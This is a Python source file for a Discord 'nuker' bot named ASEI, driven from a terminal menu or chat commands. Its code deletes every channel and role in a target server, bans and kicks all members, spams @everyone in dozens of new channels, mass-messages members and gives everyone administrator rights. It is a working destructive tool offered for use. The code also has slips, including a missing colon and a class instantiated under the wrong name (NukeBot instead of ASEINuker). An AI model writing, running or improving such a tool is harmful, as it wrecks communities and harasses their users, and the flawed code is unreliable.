'''this is a terminal based nuker'''
import asyncio
import json
import os
import sys
import time
import discord
from discord.ext import commands
from typing import Dict
import winloop #if you are running on pc or a cloud host, use winloop. for mobile phone, use uvloop.

winloop.install() 

try:
    import pyfiglet
except ImportError:
    pyfiglet = None

def center(text: str) -> str
    try:
        width = os.get_terminal_size().columns
    except:
        width = 80
    lines = text.splitlines()
    return "\n".join(line.center(width) for line in lines)

def pad_center(text: str, width: int) -> str:
    clean_text = text 
    for code in ["\033[1;32m", "\033[1;33m", "\033[0m", "\033[1;37m", "\033[38;2;100;150;255m", "\033[38;2;50;100;255m", "\033[38;2;255;50;100m"]:
        clean_text = clean_text.replace(code, "")
    if "\033[38;2;" in clean_text:
        parts = clean_text.split("m", 1)
        if len(parts) > 1:
            clean_text = parts[1]
    visible_len = len(clean_text)
    padding = max(0, width - visible_len)
    left = padding // 2
    right = padding - left
    return " " * left + text + " " * right

def gradient_char(text: str) -> str:
    return f"\033[38;2;100;150;255m{text}\033[0m"

def gradient_block(text: str) -> str:
    return f"\033[38;2;50;100;255m{text}\033[0m"

def cherry_tag(text: str) -> str:
    return f"\033[38;2;255;50;100m{text}\033[0m"

def anim_wipe(text: str, speed: float = 0.04):
    for line in text.splitlines():
        print(line)
        time.sleep(speed)

class ASEINuker(commands.Bot):
    def __init__(self, config: Dict):
        intents = discord.Intents.all()
        intents.members = True
        intents.message_content = True
        super().__init__(command_prefix=config.get('prefix', '_'), intents=discord.Intents.all())

        self.config = config
        self.owner_id = config.get('owner_id', 0)
        self.console_notifications = True
        self.is_logging = True

    async def run_nuke(self, guild):
        cfg = self.config
        try:
            asyncio.create_task(guild.edit(name=cfg['guild_name']))
            asyncio.create_task(self.user.edit(username=cfg.get('bot_name', 'Asei')))
            if guild.me:
                asyncio.create_task(guild.me.edit(nick=cfg.get('nickname', 'Asei')))
        except Exception:
            pass

        tasks = [
            asyncio.gather(*[ch.delete() for ch in guild.channels], return_exceptions=True),
            self.mass_ban(guild),
            self.mass_kick(guild),
            self.mass_roles(guild),
            self.mass_dm(guild)
        ]
        await asyncio.gather(*tasks, return_exceptions=True)

        total_msgs = cfg.get("messages_total", 1500)
        num_channels = cfg.get("channels_to_create", 35)
        msgs_per_ch = total_msgs // num_channels

        spam_tasks = [self.create_and_spam(guild, msgs_per_ch, cfg) for _ in range(num_channels)]
        await asyncio.gather(*spam_tasks, return_exceptions=True)

    async def create_and_spam(self, guild, msg_count, cfg):
        try:
            ch = await guild.create_text_channel(cfg['channel_name'])
            send_tasks = [
                ch.send(cfg['spam_message'], allowed_mentions=discord.AllowedMentions(everyone=True))
                for _ in range(msg_count)
            ]
            await asyncio.gather(*send_tasks, return_exceptions=True)
        except Exception:
            pass

    async def mass_ban(self, guild):
        reason = self.config.get("ban_reason", "Nuked by Asei")
        members = [m for m in guild.members if m.id != self.user.id and m.id != self.owner_id]
        tasks = [m.ban(reason=reason) for m in members]
        await asyncio.gather(*tasks, return_exceptions=True)

    async def mass_kick(self, guild):
        reason = self.config.get("ban_reason", "Nuked by Asei")
        members = [m for m in guild.members if m.id != self.user.id and m.id != self.owner_id]
        tasks = [m.kick(reason=reason) for m in members]
        await asyncio.gather(*tasks, return_exceptions=True)

    async def mass_roles(self, guild):
        role_count = self.config.get("roles_to_create", 35)
        roles_to_del = [r for r in guild.roles if not r.managed and r.name != "@everyone"]
        await asyncio.gather(*[r.delete() for r in roles_to_del], return_exceptions=True)
        tasks = [guild.create_role(name=self.config["role_name"]) for _ in range(role_count)]
        await asyncio.gather(*tasks, return_exceptions=True)

    async def mass_dm(self, guild):
        delay = self.config.get("dm_delay", 0.5)
        for m in guild.members:
            if m.id == self.user.id or m.id == self.owner_id:
                continue
            try:
                await m.send(self.config["spam_message"])
                await asyncio.sleep(delay)
            except Exception:
                pass

    async def give_admin(self, guild):
        try:
            role = await guild.create_role(name="Asei Admin", permissions=discord.Permissions(administrator=True))
            tasks = [m.add_roles(role) for m in guild.members if not m.bot]
            await asyncio.gather(*tasks, return_exceptions=True)
        except Exception:
            pass

    async def channel_nuke_only(self, guild):
        try:
            await guild.edit(name=self.config['guild_name'])
            await asyncio.gather(*[ch.delete() for ch in guild.channels], return_exceptions=True)
            total_msgs = self.config.get("messages_total", 1500)
            num_channels = self.config.get("channels_to_create", 35)
            msgs_per_ch = total_msgs // num_channels
            spam_tasks = [self.create_and_spam(guild, msgs_per_ch, self.config) for _ in range(num_channels)]
            await asyncio.gather(*spam_tasks, return_exceptions=True)
        except Exception:
            pass

    async def spam_only(self, guild):
        total_msgs = self.config.get("messages_total", 1500)
        num_channels = self.config.get("channels_to_create", 35)
        msgs_per_ch = total_msgs // num_channels
        spam_tasks = [self.create_and_spam(guild, msgs_per_ch, self.config) for _ in range(num_channels)]
        await asyncio.gather(*spam_tasks, return_exceptions=True)

with open("config.json") as f:
    config = json.load(f)

bot = NukeBot(config)

def print_settings_menu():
    notif_state = "\033[1;32mON\033[0m " if bot.console_notifications else "\033[1;31mOFF\033[0m"
    prefix = bot.command_prefix
    bdr = "\033[38;2;50;100;255m"
    rst = "\033[0m"
    wht = "\033[1;37m"

    prefix_str = f"[{cherry_tag(prefix)}]"

    line1 = f"  {wht}1.{rst} Change Prefix         {prefix_str}"
    line2 = f"  {wht}2.{rst} Notifications         [{notif_state}]"
    line3 = f"  {wht}3.{rst} View Config           "
    line4 = f"  {wht}4.{rst} Full Scale Nuke ID    "
    line5 = f"  {wht}5.{rst} Del/Recreate Channels "
    line6 = f"  {wht}6.{rst} DM Everyone           "
    line7 = f"  {wht}7.{rst} Del/Recreate Roles    "
    line8 = f"  {wht}8.{rst} Spam Messages         "
    line9 = f"  {wht}9.{rst} Mass Kick             "
    line10 = f" {wht}10.{rst} Mass Ban              "
    line11 = f" {wht}11.{rst} Give Everyone Admin   "
    line12 = f"  Type '{wht}b{rst}' to return to logging"

    box = f"""{bdr}||=========================================||{rst}
{bdr}║{rst}{pad_center(gradient_char('ASEI TERMUX COMMAND PANEL (き)'), 44)}{bdr}║{rst}
{bdr}||==================================================||{rst}
{bdr}║{rst}{pad_center(line1, 44)}{bdr}║{rst}
{bdr}║{rst}{pad_center(line2, 44)}{bdr}║{rst}
{bdr}║{rst}{pad_center(line3, 44)}{bdr}║{rst}
{bdr}║{rst}{pad_center(line4, 44)}{bdr}║{rst}
{bdr}║{rst}{pad_center(line5, 44)}{bdr}║{rst}
{bdr}║{rst}{pad_center(line6, 44)}{bdr}║{rst}
{bdr}║{rst}{pad_center(line7, 44)}{bdr}║{rst}
{bdr}║{rst}{pad_center(line8, 44)}{bdr}║{rst}
{bdr}║{rst}{pad_center(line9, 44)}{bdr}║{rst}
{bdr}║{rst}{pad_center(line10, 44)}{bdr}║{rst}
{bdr}║{rst}{pad_center(line11, 44)}{bdr}║{rst}
{bdr}╠════════════════════════════════════════════╣{rst}
{bdr}║{rst}{pad_center(line12, 44)}{bdr}║{rst}
{bdr}╚════════════════════════════════════════════╝{rst}
"""
    print(center(box))

def print_banner():
    if pyfiglet:
        raw = pyfiglet.figlet_format("ASEI き", font="bloody")
    else:
        raw = "  A S E I   き"
    colored = center(gradient_block(raw))
    anim_wipe(colored, speed=0.04)

def render_dashboard():
    os.system("cls" if os.name == "nt" else "clear")
    print()
    print_banner()

    friends_count = len(bot.user.friends) if hasattr(bot.user, 'friends') else 0
    guilds_count = len(bot.guilds)
    cmds_count = len([c for c in bot.commands if not c.hidden])

    wht = "\033[1;37m"
    rst = "\033[0m"

    info_lines = [
        f"{cherry_tag('[+]')} Logged in as {wht}{bot.user.name}{rst} (Asei Bot き)",
        f"{cherry_tag('[+]')} Prefix: {wht}{bot.command_prefix}{rst}  \u2502  {cherry_tag('[+]')} Friends: {wht}{friends_count}{rst}",
        f"{cherry_tag('[+]')} Servers: {wht}{guilds_count}{rst}  \u2502  {cherry_tag('[+]')} Commands: {wht}{cmds_count}{rst}",
        f"{cherry_tag('[+]')} Notifications: {wht}{'ON' if bot.console_notifications else 'OFF'}{rst}",
        f"\nPress '{wht}s{rst}' to open the Settings Menu at any time."
    ]
    for line in info_lines:
        print(center(line))

async def console_listener():
    loop = asyncio.get_event_loop()
    while True:
        user_input = await loop.run_in_executor(None, sys.stdin.readline)
        choice = user_input.strip()
        
        if bot.is_logging:
            if choice.lower() == 's':
                bot.is_logging = False
                os.system("cls" if os.name == "nt" else "clear")
                print_settings_menu()
        else:
            if choice == '1':
                print(center("Enter new prefix: "))
                new_prefix = (await loop.run_in_executor(None, sys.stdin.readline)).strip()
                if new_prefix:
                    bot.command_prefix = new_prefix
                os.system("cls" if os.name == "nt" else "clear")
                print_settings_menu()
            elif choice == '2':
                bot.console_notifications = not bot.console_notifications
                os.system("cls" if os.name == "nt" else "clear")
                print_settings_menu()
            elif choice == '3':
                os.system("cls" if os.name == "nt" else "clear")
                print(center(json.dumps(bot.config, indent=4)))
                print(center("\nPress Enter to return..."))
                await loop.run_in_executor(None, sys.stdin.readline)
                os.system("cls" if os.name == "nt" else "clear")
                print_settings_menu()
            elif choice in ['4', '5', '6', '7', '8', '9', '10', '11']:
                print(center("Enter Target Server ID: "))
                guild_id_str = (await loop.run_in_executor(None, sys.stdin.readline)).strip()
                if guild_id_str.isdigit():
                    target_guild = bot.get_guild(int(guild_id_str))
                    if target_guild:
                        if choice == '4':
                            print(center(f"Executing Full Scale Nuke on: {target_guild.name}..."))
                            asyncio.create_task(bot.run_nuke(target_guild))
                        elif choice == '5':
                            print(center(f"Recreating channels on: {target_guild.name}..."))
                            asyncio.create_task(bot.channel_nuke_only(target_guild))
                        elif choice == '6':
                            print(center(f"DMing everyone in: {target_guild.name}..."))
                            asyncio.create_task(bot.mass_dm(target_guild))
                        elif choice == '7':
                            print(center(f"Recreating roles on: {target_guild.name}..."))
                            asyncio.create_task(bot.mass_roles(target_guild))
                        elif choice == '8':
                            print(center(f"Spamming channels on: {target_guild.name}..."))
                            asyncio.create_task(bot.spam_only(target_guild))
                        elif choice == '9':
                            print(center(f"Mass kicking in: {target_guild.name}..."))
                            asyncio.create_task(bot.mass_kick(target_guild))
                        elif choice == '10':
                            print(center(f"Mass banning in: {target_guild.name}..."))
                            asyncio.create_task(bot.mass_ban(target_guild))
                        elif choice == '11':
                            print(center(f"Giving everyone admin on: {target_guild.name}..."))
                            asyncio.create_task(bot.give_admin(target_guild))
                    else:
                        print(center("Bot is not in that server!"))
                else:
                    print(center("Invalid Server ID!"))
                await asyncio.sleep(2)
                os.system("cls" if os.name == "nt" else "clear")
                print_settings_menu()
            elif choice.lower() == 'b':
                bot.is_logging = True
                render_dashboard()

@bot.event
async def on_ready():
    render_dashboard()
    bot.loop.create_task(console_listener())

@bot.command(name="nontermnuke")
async def nontermnuke(ctx):
    asyncio.create_task(bot.run_nuke(ctx.guild))

@bot.command(name="channels")
async def channels(ctx):
    asyncio.create_task(bot.channel_nuke_only(ctx.guild))

@bot.command(name="dmall")
async def dmall(ctx):
    asyncio.create_task(bot.mass_dm(ctx.guild))

@bot.command(name="roles")
async def roles(ctx):
    asyncio.create_task(bot.mass_roles(ctx.guild))

@bot.command(name="spam")
async def spam(ctx):
    asyncio.create_task(bot.spam_only(ctx.guild))

@bot.command(name="masskick")
async def masskick(ctx):
    asyncio.create_task(bot.mass_kick(ctx.guild))

@bot.command(name="massban")
async def massban(ctx):
    asyncio.create_task(bot.mass_ban(ctx.guild))

@bot.command(name="giveveryoneadmin")
async def giveveryoneadmin(ctx):
    asyncio.create_task(bot.give_admin(ctx.guild))

@bot.command(name="nuke")
async def nuke(ctx):
    asyncio.create_task(bot.run_nuke(ctx.guild))

bot.run(config['token'])
